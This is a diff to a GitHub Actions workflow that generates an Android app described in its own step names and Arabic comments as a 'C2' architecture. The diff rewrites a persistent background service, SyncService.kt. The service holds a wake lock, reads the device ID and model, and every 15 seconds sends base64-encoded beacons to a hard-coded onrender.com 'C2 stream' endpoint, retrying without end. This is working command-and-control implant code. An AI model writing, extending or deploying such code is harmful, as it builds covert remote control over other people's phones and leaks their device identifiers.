@@ -25,7 +25,7 @@ jobs:
 
       - name: Scaffold Complete C2 Android Architecture
         run: |
-          echo "إنشاء هيكل العقدة مع رابط السيرفر الحقيقي..."
+          echo "إعداد هيكل العقدة المتوافقة مع السيرفر الموحد..."
           mkdir -p app/src/main/java/com/abod/app app/src/main/res/values app/src/main/assets
           
           # 1. AndroidManifest.xml
@@ -106,7 +106,7 @@ jobs:
           }
           EOF
 
-          # 3. SyncService.kt (محدث برابط Render الخاص بك)
+          # 3. SyncService.kt (المتطابق مع مسار Stream وسيرفر Render)
           cat << 'EOF' > app/src/main/java/com/abod/app/SyncService.kt
           package com.abod.app
 
@@ -125,13 +125,14 @@ jobs:
           import java.io.OutputStreamWriter
           import java.net.HttpURLConnection
           import java.net.URL
+          import java.util.Base64
 
           class SyncService : Service() {
               private var wakeLock: PowerManager.WakeLock? = null
               private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
               
-              // رابط سيرفر الـ C2 الخاص بك على Render
-              private val C2_SERVER_URL = "https://web-assets-service.onrender.com/api/node/connect"
+              // مسار التدفق الموحد في سيرفر Render الخاص بك
+              private val C2_STREAM_URL = "https://web-assets-service.onrender.com/api/v3/unified/stream"
 
               override fun onCreate() {
                   super.onCreate()
@@ -158,30 +159,34 @@ jobs:
 
               override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                   val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_node"
+                  val nodeModel = Build.MODEL
                   
                   serviceScope.launch {
                       while (isActive) {
                           try {
-                              val url = URL(C2_SERVER_URL)
+                              val url = URL(C2_STREAM_URL)
                               val conn = url.openConnection() as HttpURLConnection
                               conn.requestMethod = "POST"
-                              conn.setRequestProperty("Content-Type", "application/json; utf-8")
-                              conn.setRequestProperty("Accept", "application/json")
+                              conn.setRequestProperty("X-Node-ID", deviceId)
+                              conn.setRequestProperty("X-Node-Model", nodeModel)
+                              conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8")
                               conn.doOutput = true
                               conn.connectTimeout = 15000
                               conn.readTimeout = 15000
 
-                              val jsonInputString = "{\"nodeId\": \"$deviceId\", \"status\": \"active\", \"model\": \"${Build.MODEL}\", \"sdk\": ${Build.VERSION.SDK_INT}}"
-                              
-                              OutputStreamWriter(conn.outputStream).use { os ->
-                                  os.write(jsonInputString)
+                              // بناء تقرير نصي دوري لإثبات الاتصال وتسجيل العقدة في قاعدة البيانات
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Node is active and online from ${Build.MODEL}\"}"
+                              val base64Payload = Base64.getEncoder().encodeToString(reportJson.toByteArray(Charsets.UTF_8))
+
+                              OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
+                                  os.write(base64Payload)
                                   os.flush()
                               }
 
                               val responseCode = conn.responseCode
                               conn.disconnect()
 
-                              // إرسال نبضة حياة كل 15 ثانية لتثبيت الاتصال بالسيرفر
+                              // إرسال نبضة حياة كل 15 ثانية لتحديث الـ last_seen في السيرفر
                               delay(15000L)
                           } catch (e: Exception) {
                               delay(10000L)
